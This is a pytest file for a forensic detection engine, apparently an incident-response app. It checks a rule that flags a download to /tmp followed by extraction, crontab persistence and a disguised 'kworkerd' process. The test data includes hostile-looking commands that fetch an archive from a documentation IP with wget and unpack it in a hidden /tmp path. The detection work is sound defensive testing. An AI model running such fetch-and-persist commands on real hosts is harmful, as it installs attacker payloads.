import uuid
from pathlib import Path

from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.main import app as fastapi_app
from app.core.dependencies import get_current_user
from app.core.security import hash_password
from app.db.base import Base
import app.db.models  # noqa: F401
from app.db.models.case import Case, CaseStatus
from app.db.models.user import User, UserRole
from app.db.session import get_db
from app.api.v1 import evidence as evidence_module
from app.parsers.auditd import AuditdParser
from app.services.detection_engine import (
    DEFAULT_TMP_INGRESS_WINDOW_SECONDS,
    MAX_TMP_INGRESS_WINDOW_SECONDS,
    MIN_TMP_INGRESS_WINDOW_SECONDS,
    execute_detections_on_events,
)
from app.services.normalizer import normalize_records


WEB_COMPROMISE_DIR = (
    Path(__file__).resolve().parents[1] / "test_evidence" / "web_server_compromise"
)


def test_tmp_download_transfer_correlation_t1105_and_window():
    audit_path = WEB_COMPROMISE_DIR / "03_auditd.log"
    assert audit_path.is_file()

    records = AuditdParser().parse(audit_path, original_filename="03_auditd.log")
    normalized = normalize_records(records, default_filename="03_auditd.log")
    events = []
    for idx, rec in enumerate(normalized):
        rec["id"] = f"aud-{idx}"
        events.append(rec)

    findings = execute_detections_on_events(events, uuid.uuid4())
    transfer_findings = [f for f in findings if f["rule_id"] == "rule-tmp-download-exec"]
    assert len(transfer_findings) == 1

    finding = transfer_findings[0]
    assert finding["mitre_technique"] == "T1105"
    assert finding["mitre_tactic"] == "Command and Control"
    assert finding["user"] == "root"
    assert "chmod +x" not in finding["description"].lower()

    by_id = {e["id"]: e["details"]["command_line"] for e in events}
    matched_cmds = [by_id[eid] for eid in finding["matching_event_ids"]]
    assert any(cmd.startswith("wget ") and "/tmp/.x.tgz" in cmd for cmd in matched_cmds)
    assert any(cmd.startswith("tar ") and "/tmp/.x.tgz" in cmd for cmd in matched_cmds)
    assert any(cmd.startswith("crontab ") and "/tmp/.cron" in cmd for cmd in matched_cmds)
    assert any("kworkerd" in cmd for cmd in matched_cmds)
    assert not any(cmd.startswith("scp ") for cmd in matched_cmds)
    assert not any(cmd.startswith("rm ") for cmd in matched_cmds)

    # Isolated wget with no follow-up within 5 minutes must not fire
    isolated = [
        {
            "id": "iso-1",
            "timestamp": "2026-07-22T02:00:00Z",
            "event_type": "auditd",
            "details": {"host": "WEB-01", "user": "root", "command_line": "wget http://198.51.100.201/a.tgz -O /tmp/.a.tgz"},
        },
        {
            "id": "iso-2",
            "timestamp": "2026-07-22T02:06:00Z",
            "event_type": "auditd",
            "details": {"host": "WEB-01", "user": "root", "command_line": "tar xzf /tmp/.a.tgz -C /tmp/.a"},
        },
    ]
    assert [f for f in execute_detections_on_events(isolated, uuid.uuid4()) if f["rule_id"] == "rule-tmp-download-exec"] == []


def test_tmp_download_transfer_api_finding_with_auditd_uid_zero(tmp_path, monkeypatch):
    auth_path = WEB_COMPROMISE_DIR / "02_auth.log"
    audit_path = WEB_COMPROMISE_DIR / "03_auditd.log"
    assert auth_path.is_file() and audit_path.is_file()

    test_db = tmp_path / "ingress_transfer.sqlite"
    engine = create_engine(f"sqlite:///{test_db}", connect_args={"check_same_thread": False})
    Base.metadata.create_all(bind=engine)
    TestSession = sessionmaker(bind=engine, autoflush=False, autocommit=False)
    upload_dir = tmp_path / "evidence_uploads"
    upload_dir.mkdir(parents=True, exist_ok=True)
    monkeypatch.setattr(evidence_module, "UPLOAD_DIR", upload_dir)

    db = TestSession()
    user = User(
        username=f"inv_{uuid.uuid4().hex[:8]}",
        email=f"inv_{uuid.uuid4().hex[:8]}@dcsre.test",
        hashed_password=hash_password("Investigator#2026"),
        role=UserRole.INVESTIGATOR,
        is_active=True,
    )
    db.add(user)
    db.flush()
    case = Case(
        name="Ingress Transfer Case",
        description="Auth + Auditd",
        status=CaseStatus.OPEN,
        created_by=user.id,
    )
    db.add(case)
    db.commit()

    def override_get_db():
        session = TestSession()
        try:
            yield session
        finally:
            session.close()

    prev_db = fastapi_app.dependency_overrides.get(get_db)
    prev_user = fastapi_app.dependency_overrides.get(get_current_user)
    fastapi_app.dependency_overrides[get_db] = override_get_db
    fastapi_app.dependency_overrides[get_current_user] = lambda: user
    try:
        client = TestClient(fastapi_app)
        for fname in ("02_auth.log", "03_auditd.log"):
            fpath = WEB_COMPROMISE_DIR / fname
            with fpath.open("rb") as fh:
                res = client.post(
                    f"/api/v1/evidence/cases/{case.id}/evidence/upload",
                    files={"file": (fname, fh, "text/plain")},
                    data={"description": fname},
                )
                assert res.status_code == 201, res.text

        events_by_id = {
            str(e["id"]): e
            for e in client.get(f"/api/v1/events/cases/{case.id}/events").json()
        }
        detections = client.get(f"/api/v1/detections/cases/{case.id}/detections").json()
        transfer_findings = [d for d in detections if d.get("rule_id") == "rule-tmp-download-exec"]
        assert len(transfer_findings) == 1

        finding = transfer_findings[0]
        assert finding["mitre_technique"] == "T1105"
        assert finding["mitre_tactic"] == "Command and Control"
        assert "WEB-01" in (finding.get("hosts") or [])

        # User comes from uid=0 ("root"), never a command name like "scp"
        entity_users = (finding.get("entities_involved") or {}).get("users") or []
        assert entity_users == ["root"]
        assert not (set(entity_users) & {"scp", "wget", "tar", "crontab", "kworkerd"})

        matched_cmds = [events_by_id[eid].get("command_line") or "" for eid in finding["matched_event_ids"]]
        assert len(matched_cmds) == 4
        assert any("wget" in cmd and "/tmp/.x.tgz" in cmd for cmd in matched_cmds)
        assert any("tar" in cmd and "/tmp/.x.tgz" in cmd for cmd in matched_cmds)
        assert any("crontab" in cmd and "/tmp/.cron" in cmd for cmd in matched_cmds)
        assert any("kworkerd" in cmd for cmd in matched_cmds)
    finally:
        if prev_db is not None:
            fastapi_app.dependency_overrides[get_db] = prev_db
        else:
            fastapi_app.dependency_overrides.pop(get_db, None)
        if prev_user is not None:
            fastapi_app.dependency_overrides[get_current_user] = prev_user
        else:
            fastapi_app.dependency_overrides.pop(get_current_user, None)
        db.close()
        engine.dispose()


def test_tmp_download_window_6min_missed_at_default_300_and_detected_at_600(tmp_path, monkeypatch):
    import pytest
    from app.db.models.events import Event

    assert DEFAULT_TMP_INGRESS_WINDOW_SECONDS == 300

    six_min_events = [
        {
            "id": "gap-1",
            "timestamp": "2026-07-22T02:00:00Z",
            "event_type": "auditd",
            "details": {"host": "WEB-01", "user": "root", "command_line": "wget http://198.51.100.201/a.tgz -O /tmp/.a.tgz"},
        },
        {
            "id": "gap-2",
            "timestamp": "2026-07-22T02:06:00Z",
            "event_type": "auditd",
            "details": {"host": "WEB-01", "user": "root", "command_line": "tar xzf /tmp/.a.tgz -C /tmp/.a"},
        },
    ]

    # Default 300s misses the 6-minute (360s) gap
    default_findings = [
        f for f in execute_detections_on_events(six_min_events, uuid.uuid4())
        if f["rule_id"] == "rule-tmp-download-exec"
    ]
    assert default_findings == []

    # 600s window catches it and states the configured window in description & metadata
    custom_findings = [
        f for f in execute_detections_on_events(six_min_events, uuid.uuid4(), tmp_ingress_window_seconds=600)
        if f["rule_id"] == "rule-tmp-download-exec"
    ]
    assert len(custom_findings) == 1
    assert "600 seconds" in custom_findings[0]["description"]
    assert custom_findings[0]["rule_information"]["tmp_ingress_window_seconds"] == 600
    assert custom_findings[0]["matching_event_ids"] == ["gap-1", "gap-2"]

    # Also verify per-run API parameter on POST /detections/cases/{case_id}/run
    test_db = tmp_path / "tmp_window_api.sqlite"
    engine = create_engine(f"sqlite:///{test_db}", connect_args={"check_same_thread": False})
    Base.metadata.create_all(bind=engine)
    TestSession = sessionmaker(bind=engine, autoflush=False, autocommit=False)
    db = TestSession()
    user = User(
        username=f"inv_{uuid.uuid4().hex[:8]}",
        email=f"inv_{uuid.uuid4().hex[:8]}@dcsre.test",
        hashed_password=hash_password("Investigator#2026"),
        role=UserRole.INVESTIGATOR,
        is_active=True,
    )
    db.add(user)
    db.flush()
    case = Case(name="Window API Case", description="6min test", status=CaseStatus.OPEN, created_by=user.id)
    db.add(case)
    db.flush()
    ev_id = uuid.uuid4()
    from app.db.models.evidence import Evidence, ParsingStatus
    ev_row = Evidence(
        id=ev_id,
        case_id=case.id,
        uploaded_by=user.id,
        filename="audit.log",
        description="",
        file_type="text/plain",
        file_path=str(tmp_path / "audit.log"),
        sha256_hash="0" * 64,
        file_size=10,
        parsing_status=ParsingStatus.PARSED,
    )
    db.add(ev_row)
    db.flush()
    from datetime import datetime, timezone
    db.add_all([
        Event(
            id=uuid.uuid4(), case_id=case.id, evidence_id=ev_id,
            timestamp=datetime(2026, 7, 22, 2, 0, 0, tzinfo=timezone.utc),
            event_type="auditd", source="auditd",
            details=six_min_events[0]["details"], fingerprint="f" * 64,
        ),
        Event(
            id=uuid.uuid4(), case_id=case.id, evidence_id=ev_id,
            timestamp=datetime(2026, 7, 22, 2, 6, 0, tzinfo=timezone.utc),
            event_type="auditd", source="auditd",
            details=six_min_events[1]["details"], fingerprint="e" * 64,
        ),
    ])
    db.commit()

    def override_get_db():
        session = TestSession()
        try:
            yield session
        finally:
            session.close()

    prev_db = fastapi_app.dependency_overrides.get(get_db)
    prev_user = fastapi_app.dependency_overrides.get(get_current_user)
    fastapi_app.dependency_overrides[get_db] = override_get_db
    fastapi_app.dependency_overrides[get_current_user] = lambda: user
    try:
        client = TestClient(fastapi_app)
        res_default = client.post(f"/api/v1/detections/cases/{case.id}/run")
        assert res_default.status_code == 200
        assert [d for d in res_default.json() if d["rule_id"] == "rule-tmp-download-exec"] == []

        res_600 = client.post(f"/api/v1/detections/cases/{case.id}/run", params={"tmp_ingress_window_seconds": 600})
        assert res_600.status_code == 200
        found = [d for d in res_600.json() if d["rule_id"] == "rule-tmp-download-exec"]
        assert len(found) == 1
        assert "600 seconds" in found[0]["description"]
        assert found[0]["rule_information"]["tmp_ingress_window_seconds"] == 600

        # Invalid API values rejected
        for bad_val in (0, -10, MIN_TMP_INGRESS_WINDOW_SECONDS - 1, MAX_TMP_INGRESS_WINDOW_SECONDS + 1, "abc"):
            bad_res = client.post(
                f"/api/v1/detections/cases/{case.id}/run",
                params={"tmp_ingress_window_seconds": bad_val},
            )
            assert bad_res.status_code == 422, f"Expected 422 for {bad_val!r}, got {bad_res.status_code}"
    finally:
        if prev_db is not None:
            fastapi_app.dependency_overrides[get_db] = prev_db
        else:
            fastapi_app.dependency_overrides.pop(get_db, None)
        if prev_user is not None:
            fastapi_app.dependency_overrides[get_current_user] = prev_user
        else:
            fastapi_app.dependency_overrides.pop(get_current_user, None)
        db.close()
        engine.dispose()

    # Invalid direct Python values rejected
    for bad_direct in (0, -5, MIN_TMP_INGRESS_WINDOW_SECONDS - 1, MAX_TMP_INGRESS_WINDOW_SECONDS + 1, True, 300.5, "300"):
        with pytest.raises(ValueError):
            execute_detections_on_events(six_min_events, uuid.uuid4(), tmp_ingress_window_seconds=bad_direct)  # type: ignore[arg-type]
